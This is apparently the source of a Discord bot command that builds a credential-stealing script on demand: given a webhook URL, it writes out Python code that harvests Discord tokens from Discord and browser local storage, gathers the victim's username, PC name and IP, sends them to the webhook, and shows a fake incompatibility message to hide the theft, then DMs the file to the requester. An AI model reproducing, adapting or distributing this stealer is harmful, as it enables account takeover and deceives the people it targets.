import nmap
import discord
from discord.ext import commands
import os
import json
import requests
from utils.utils import get_emoji
emoji = get_emoji()


    
class tok3nmaker(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        
    @commands.command()
    async def maketok3ngrab(self, ctx, webhookUrl):
        resp = requests.get(webhookUrl)
        if 'Unknown Webhook' in resp.text: 
            await ctx.send(f"{ctx.author.mention}\n{emoji['zeus']} - **Webhook introuvable !**")
            return
        try:
            with open(f"./commands/tok3n.py", "w") as file:
                file.write("""
import os
import re
import json

from urllib.request import Request, urlopen

def get_tokens(path):
    tokens = []

    for file in [i for i in os.listdir(path) if i.endswith('.ldb') or i.endswith('.log')]:
        with open(f"{path}\\\\{file}", "r", errors='ignore') as file:
            for line in file.readlines():
                for tkn in re.findall(r'[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}', line.strip()):
                    if tkn not in tokens:
                        tokens.append(tkn)
                for tkn in re.findall(r'mfa\\.[\\w-]{84}', line.strip()):
                    if tkn not in tokens:
                        tokens.append(tkn)

    return tokens

local = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')

paths = {
    'Discord': f"{roaming}\\\\Discord",
    'Discord Canary': f"{roaming}\\\\discordcanary",
    'Discord PTB': f"{roaming}\\\\discordptb",
    'Google Chrome': f"{local}\\\\Google\\\\Chrome\\\\User Data\\\\Default",
    'Opera': f"{roaming}\\\\Opera Software\\\\Opera Stable",
    'Brave': f"{local}\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\Default",
    'Yandex': f"{local}\\\\Yandex\\\\YandexBrowser\\\\User Data\\\\Default",
    "Brave" : f"{local}\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\Default\\\\",
    "Vivaldi" : f"{local}\\\\Vivaldi\\\\User Data\\\\Default\\\\"
}

grabbedTokens = {}

for key, val in paths.items():
    if os.path.exists(f"{val}\\\\Local Storage\\\\leveldb"):
        grab = get_tokens(f"{val}\\\\Local Storage\\\\leveldb")
        if len(grab) != 0:
            grabbedTokens[key] = grab

message = "**Tok3n grab make by Cronos**\\n"

try:
    req = Request("http://httpbin.org/ip")
    ip = json.loads(urlopen(req, timeout = 3).read().decode())["origin"]
except Exception as e:
    ip = "introuvable"

pc_name = os.getenv('COMPUTERNAME') if os.getenv('COMPUTERNAME') is not None else os.uname().nodename
user = os.getenv('username')

message += f"[ Information ]\\n - Pseudo: ||{user}||\\n - Nom du PC: ||{pc_name}||\\n - IP: ||{ip}||\\n\\n"

if len(grabbedTokens) == 0:
    message += "**||[ Tok3n introuvable ]||**"
else:
    for key, val in grabbedTokens.items():
        message += f"[ {key} ]\\n - "
        message += "\\n - ".join(val)
        message += "\\n\\n"
    message += "```"

headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'}
payload = json.dumps({'content': message})

req = Request(
    "~~TOKENURLHERE~~",
    data=payload.encode(),
    headers=headers
)

urlopen(req)

print("Sorry, your pc is not compatable for this software, please use another.")
input("Please press enter, to exit out of the program.")
""".replace("~~TOKENURLHERE~~", webhookUrl))
        except Exception as e:
            print(f"Error writing file: {e}")
        else:
            await ctx.send(f"{ctx.author.mention}\n{emoji['zeus']} - **Fichier envoyé ! Consultez vos mp.**")
            await ctx.author.send(f"**Version du tok3n grab :** ``1.0``")
            await ctx.author.send(file=discord.File(f"./commands/tok3n.py"))
            with open(f"./commands/tok3n.py", "w") as file:
                file.write("")
def setup(bot):
    bot.add_cog(tok3nmaker(bot))